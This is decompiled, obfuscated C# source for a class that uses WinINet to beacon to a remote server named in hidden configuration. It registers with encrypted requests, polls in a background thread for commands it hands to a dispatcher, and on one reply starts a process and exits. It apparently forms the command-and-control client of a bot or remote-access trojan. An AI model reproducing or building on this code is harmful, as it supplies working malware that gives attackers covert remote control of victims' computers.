using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using ns5;

namespace ns6;

internal class Class8 : Class7
{
	private enum Enum3 : uint
	{
		const_0 = 0u,
		const_1 = 1u,
		const_2 = 2u,
		const_3 = 3u,
		const_4 = 0u,
		const_5 = 1u
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct Struct1
	{
		[MarshalAs(UnmanagedType.U4)]
		public uint uint_0;

		[MarshalAs(UnmanagedType.U4)]
		public uint uint_1;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 64)]
		public byte[] byte_0;

		public Struct1(byte[] byte_1)
		{
			Class9.smethod_2(ref byte_1);
			GCHandle gCHandle = GCHandle.Alloc(byte_1, GCHandleType.Pinned);
			IntPtr ptr = gCHandle.AddrOfPinnedObject();
			gCHandle.Free();
			this = (Struct1)Marshal.PtrToStructure(ptr, typeof(Struct1));
		}
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct Ek5
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 38)]
		public byte[] byte_0;

		[MarshalAs(UnmanagedType.U4)]
		public uint uint_0;

		[MarshalAs(UnmanagedType.U4)]
		public uint uint_1;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 64)]
		public byte[] byte_1;

		public Ek5(string string_0, uint uint_2, uint uint_3, byte[] byte_2)
		{
			//Error decoding local variables: Signature type sequence must have at least one element.
			byte_0 = new byte[38];
			byte_1 = new byte[64];
			uint_0 = uint_2;
			uint_1 = uint_3;
			Array.Copy(Encoding.Default.GetBytes(string_0), 0, byte_0, 0, string_0.Length);
			Array.Copy(byte_2, 0, byte_1, 0, byte_2.Length);
		}
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct Struct2
	{
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 20)]
		public byte[] byte_0;

		[MarshalAs(UnmanagedType.U4)]
		public int int_0;

		[MarshalAs(UnmanagedType.U4)]
		public int int_1;

		public Struct2(string string_0, int int_2, int int_3)
		{
			byte_0 = new byte[20];
			int_0 = int_2;
			int_1 = int_3;
			Array.Copy(Encoding.Default.GetBytes(string_0), 0, byte_0, 0, string_0.Length);
		}
	}

	private const uint uint_1 = 1u;

	private const short short_0 = 80;

	private const uint uint_2 = 3u;

	private const uint uint_3 = 512u;

	private const uint uint_4 = 19u;

	private const uint uint_5 = 536870912u;

	private const uint uint_6 = 43u;

	private const uint uint_7 = 200u;

	private static IntPtr intptr_0 = IntPtr.Zero;

	private static Thread thread_0 = new Thread(smethod_5);

	private static bool bool_0 = false;

	private static string string_1 = string.Empty;

	public static void smethod_2()
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		if (bool_0)
		{
			bool_0 = false;
		}
		if (string_1 != string.Empty && string_1.IndexOf(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_2()) == -1)
		{
			string_1 = string_1 + Environment.NewLine + _003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_3();
		}
		smethod_3();
	}

	private static void smethod_3()
	{
		IntPtr intPtr = InternetOpen(Class13.string_4, 1u, null, null, 0u);
		if (intPtr != IntPtr.Zero)
		{
			if (intptr_0 != IntPtr.Zero)
			{
				InternetCloseHandle(intptr_0);
			}
			intptr_0 = InternetConnect(intPtr, Encoding.Default.GetString(Class13.byte_0), 80, null, null, 3u, 0u, IntPtr.Zero);
			if (intptr_0 != IntPtr.Zero)
			{
				byte[] array = smethod_7(0u, Class9.smethod_0(), bool_1: false);
				if (array.Length > 0 && new Struct1(array).uint_1 == 1)
				{
					string_1 = string_1.Substring(0, string_1.IndexOf(Environment.NewLine));
					smethod_4();
					return;
				}
			}
			InternetCloseHandle(intPtr);
		}
		Thread.Sleep(1000 * Class13.int_0);
		smethod_2();
	}

	private static void smethod_4()
	{
		if (new Struct1(smethod_7(1u, new Struct2(Class13.string_3, Class13.ushort_0, Class13.int_1), bool_1: true)).uint_1 == 1)
		{
			bool_0 = true;
			thread_0.Start();
		}
		else
		{
			smethod_2();
		}
	}

	private static void smethod_5()
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		while (bool_0)
		{
			try
			{
				Class7.smethod_0(new Struct1(smethod_7(2u, null, bool_1: true)));
			}
			catch
			{
			}
			Thread.Sleep(1000 * Class13.int_0);
		}
	}

	public static void smethod_6()
	{
		Struct1 @struct = new Struct1(smethod_7(3u, null, bool_1: true));
		if (@struct.uint_1 == 1)
		{
			string @string = Encoding.Default.GetString(@struct.byte_0);
			char[] trimChars = new char[1];
			string text = @string.Trim(trimChars);
			if (text != string.Empty)
			{
				Class11.smethod_2();
				if (!VG.smethod_7(text))
				{
					Process.Start(Class13.string_0);
				}
				Environment.Exit(0);
			}
		}
		else
		{
			smethod_2();
		}
	}

	private static byte[] smethod_7(uint uint_8, object object_0, bool bool_1)
	{
		IntPtr intPtr = HttpOpenRequest(intptr_0, _003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_4(), Class13.string_1, null, null, null, 2214917888u, IntPtr.Zero);
		if (intPtr != IntPtr.Zero)
		{
			byte[] array = new byte[0];
			if (bool_1)
			{
				array = VG.smethod_3(new Ek5(Class13.string_2, VG.smethod_8(), uint_8, VG.smethod_3(object_0)));
				Class9.smethod_1(ref array);
			}
			else
			{
				array = VG.smethod_3(object_0);
			}
			if (HttpSendRequest(intPtr, string_1, (uint)string_1.Length, array, (uint)array.Length))
			{
				IntPtr intPtr2 = Marshal.AllocHGlobal(4);
				uint uint_9 = 4u;
				if (HttpQueryInfo(intPtr, 536870931u, intPtr2, ref uint_9, null) && Marshal.ReadInt32(intPtr2) == 200L)
				{
					Marshal.FreeHGlobal(intPtr2);
					IntPtr intPtr3 = Marshal.AllocHGlobal(128);
					uint_9 = 128u;
					if (HttpQueryInfo(intPtr, 43u, intPtr3, ref uint_9, null))
					{
						string text = Marshal.PtrToStringUni(intPtr3)!.TrimStart(new char[0]);
						if (text.StartsWith(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_5()))
						{
							string_1 = _003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_6() + text.Substring(0, text.IndexOf(';')) + Environment.NewLine;
						}
					}
					Marshal.FreeHGlobal(intPtr3);
					IntPtr intPtr4 = Marshal.AllocHGlobal(512);
					uint_9 = 512u;
					InternetReadFile(intPtr, intPtr4, 512u, ref uint_9);
					InternetCloseHandle(intPtr);
					byte[] array2 = new byte[uint_9];
					Marshal.Copy(intPtr4, array2, 0, (int)uint_9);
					Marshal.FreeHGlobal(intPtr4);
					return array2;
				}
				Marshal.FreeHGlobal(intPtr2);
			}
			InternetCloseHandle(intPtr);
		}
		return new byte[0];
	}

	[DllImport("wininet", CharSet = CharSet.Unicode)]
	private static extern IntPtr InternetOpen(string string_2, uint uint_8, string string_3, string string_4, uint uint_9);

	[DllImport("wininet", CharSet = CharSet.Unicode)]
	private static extern bool InternetCloseHandle(IntPtr intptr_1);

	[DllImport("wininet", CharSet = CharSet.Unicode)]
	private static extern IntPtr InternetConnect(IntPtr DX, string string_2, short short_1, string string_3, string string_4, uint LP, uint uint_8, IntPtr intptr_1);

	[DllImport("wininet", CharSet = CharSet.Unicode)]
	private static extern IntPtr HttpOpenRequest(IntPtr intptr_1, string string_2, string string_3, string string_4, string string_5, string[] string_6, uint uint_8, IntPtr intptr_2);

	[DllImport("wininet", CharSet = CharSet.Unicode)]
	private static extern bool HttpSendRequest(IntPtr intptr_1, string string_2, uint uint_8, byte[] byte_0, uint uint_9);

	[DllImport("wininet", CharSet = CharSet.Unicode)]
	private static extern bool HttpQueryInfo(IntPtr intptr_1, uint uint_8, IntPtr intptr_2, ref uint uint_9, object object_0);

	[DllImport("wininet", CharSet = CharSet.Unicode)]
	private static extern bool InternetReadFile(IntPtr intptr_1, IntPtr FA, uint uint_8, ref uint uint_9);
}
